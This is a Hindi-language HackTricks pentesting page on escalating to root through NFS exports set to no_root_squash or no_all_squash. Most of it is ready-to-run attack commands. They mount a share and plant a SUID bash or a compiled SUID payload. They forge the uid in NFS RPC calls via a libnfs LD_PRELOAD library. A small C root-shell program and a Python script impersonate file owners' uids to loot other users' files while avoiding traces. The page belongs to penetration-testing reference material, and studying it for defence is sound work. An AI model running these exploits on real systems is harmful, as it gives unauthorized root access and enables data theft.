<details>

<summary><strong>शून्य से नायक तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
* **अपनी हैकिंग ट्रिक्स साझा करें, HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके.

</details>


_ **/etc/exports** _ फाइल पढ़ें, यदि आपको कोई डायरेक्टरी मिलती है जो **no\_root\_squash** के रूप में कॉन्फ़िगर की गई है, तो आप उसे **क्लाइंट के रूप में एक्सेस** कर सकते हैं और उस डायरेक्टरी में **लिख सकते हैं** जैसे कि आप उस मशीन के स्थानीय **रूट** हों।

**no\_root\_squash**: यह विकल्प मूल रूप से क्लाइंट पर रूट यूजर को NFS सर्वर पर फाइलों तक रूट के रूप में पहुँचने की अनुमति देता है। और इससे गंभीर सुरक्षा प्रभाव हो सकते हैं।

**no\_all\_squash:** यह **no\_root\_squash** विकल्प के समान है लेकिन **गैर-रूट यूजर्स** पर लागू होता है। कल्पना कीजिए, आपके पास nobody यूजर के रूप में एक शेल है; /etc/exports फाइल चेक की; no\_all\_squash विकल्प मौजूद है; /etc/passwd फाइल चेक करें; एक गैर-रूट यूजर की नकल करें; एक suid फाइल उस यूजर के रूप में बनाएं (nfs का उपयोग करके माउंट करके)। nobody यूजर के रूप में suid निष्पादित करें और अलग यूजर बनें।

# विशेषाधिकार वृद्धि

## रिमोट एक्सप्लॉइट

यदि आपने यह कमजोरी पाई है, तो आप इसे इस्तेमाल कर सकते हैं:

* **उस डायरेक्टरी को माउंट करना** क्लाइंट मशीन में, और **रूट के रूप में कॉपी करना** माउंटेड फोल्डर में **/bin/bash** बाइनरी और उसे **SUID** अधिकार देना, और **पीड़ित** मशीन से उस bash बाइनरी को **निष्पादित करना**।
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **उस डायरेक्टरी को माउंट करना** क्लाइंट मशीन में, और **रूट के रूप में कॉपी करना** माउंटेड फोल्डर के अंदर हमारा कंपाइल किया हुआ पेलोड जो SUID अनुमति का दुरुपयोग करेगा, उसे **SUID** अधिकार देना, और **पीड़ित** मशीन से उस बाइनरी को निष्पादित करना (आप यहाँ कुछ [C SUID पेलोड्स](payloads-to-execute.md#c) देख सकते हैं)।
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## स्थानीय एक्सप्लॉइट

{% hint style="info" %}
ध्यान दें कि यदि आप अपनी मशीन से पीड़ित मशीन तक एक **टनल बना सकते हैं, तो आप इस विशेषाधिकार एस्केलेशन को दूरस्थ रूप से उपयोग करने के लिए आवश्यक पोर्ट्स को टनलिंग करके अभी भी रिमोट वर्जन का उपयोग कर सकते हैं**।\
निम्नलिखित चाल तब है जब फाइल `/etc/exports` **एक IP इंगित करता है**। इस मामले में आप **किसी भी मामले में रिमोट एक्सप्लॉइट का उपयोग नहीं कर पाएंगे** और आपको इस चाल का **दुरुपयोग करना होगा**।\
एक्सप्लॉइट के काम करने के लिए एक और आवश्यक शर्त यह है कि `/etc/export` के अंदर का **निर्यात `insecure` फ्लैग का उपयोग कर रहा होना चाहिए**।\
\--_मुझे यकीन नहीं है कि अगर `/etc/export` एक IP पते का संकेत दे रहा है तो यह चाल काम करेगी_--
{% endhint %}

**चाल [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs\_privesc.html) से नकल की गई है**

अब, मान लीजिए कि शेयर सर्वर अभी भी `no_root_squash` चला रहा है लेकिन हमारे पेंटेस्ट मशीन पर शेयर को माउंट करने से रोकने वाली कुछ है। यह तब होगा जब `/etc/exports` में शेयर को माउंट करने के लिए अनुमति वाले IP पतों की स्पष्ट सूची हो।

शेयर्स की सूची अब दिखाती है कि केवल वही मशीन जिस पर हम प्रिवेस्क करने की कोशिश कर रहे हैं, उसे माउंट करने की अनुमति है:
```
[root@pentest]# showmount -e nfs-server
Export list for nfs-server:
/nfs_root   machine
```
इसका मतलब है कि हमें मशीन पर स्थापित शेयर का उपयोग करते हुए स्थानीय रूप से एक अनाधिकृत उपयोगकर्ता से शोषण करने के लिए फंसना पड़ता है। लेकिन ऐसा होता है कि एक अन्य, कम ज्ञात स्थानीय शोषण भी है।

यह शोषण NFSv3 विनिर्देश में एक समस्या पर निर्भर करता है जो यह आवश्यकता बताता है कि शेयर तक पहुँचते समय यह ग्राहक की जिम्मेदारी है कि वह अपनी uid/gid की घोषणा करे। इस प्रकार, यदि शेयर पहले से ही स्थापित है तो NFS RPC कॉल्स को फोर्ज करके uid/gid को नकली बनाना संभव है!

यहाँ एक [लाइब्रेरी है जो आपको बिल्कुल यही करने देती है](https://github.com/sahlberg/libnfs)।

### उदाहरण संकलन करना <a href="#compiling-the-example" id="compiling-the-example"></a>

आपके कर्नेल के आधार पर, आपको उदाहरण को अनुकूलित करने की आवश्यकता हो सकती है। मेरे मामले में मुझे fallocate सिस्टम कॉल्स को कमेंट आउट करना पड़ा।
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### पुस्तकालय का उपयोग करके शोषण <a href="#exploiting-using-the-library" id="exploiting-using-the-library"></a>

आइए सबसे सरल शोषण का उपयोग करें:
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
हमारे एक्सप्लॉइट को शेयर पर रखें और RPC कॉल्स में हमारे uid को फेक करके इसे suid root बनाएं:
```
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
अब बस इसे लॉन्च करना बाकी है:
```
[w3user@machine libnfs]$ /mnt/share/a.out
[root@machine libnfs]#
```
हम वहां हैं, स्थानीय रूट विशेषाधिकार वृद्धि!

## बोनस NFShell <a href="#bonus-nfshell" id="bonus-nfshell"></a>

मशीन पर स्थानीय रूट होने के बाद, मैं NFS शेयर को संभावित रहस्यों के लिए लूटना चाहता था जो मुझे पिवट करने की अनुमति देते। लेकिन वहां अपने यूआईडी के साथ कई उपयोगकर्ता थे जिन्हें मैं रूट होने के बावजूद यूआईडी मिसमैच के कारण पढ़ नहीं सकता था। मैं चोवन -R जैसे स्पष्ट निशान छोड़ना नहीं चाहता था, इसलिए मैंने एक छोटा स्निपेट बनाया जो मेरे यूआईडी को वांछित शेल कमांड चलाने से पहले सेट करता है:
```python
#!/usr/bin/env python
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
फिर आप अधिकांश कमांड्स को सामान्य रूप से चला सकते हैं, उन्हें स्क्रिप्ट के साथ प्रीफिक्स करके:
```
[root@machine .tmp]# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
[root@machine .tmp]# ls -la ./mount/9.3_old/
ls: cannot open directory ./mount/9.3_old/: Permission denied
[root@machine .tmp]# ./nfsh.py ls --color -l ./mount/9.3_old/
drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
drwx------ 15 1008 1009 1024 Apr  5  2017 data
drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
```
<details>

<summary><strong>शून्य से नायक तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
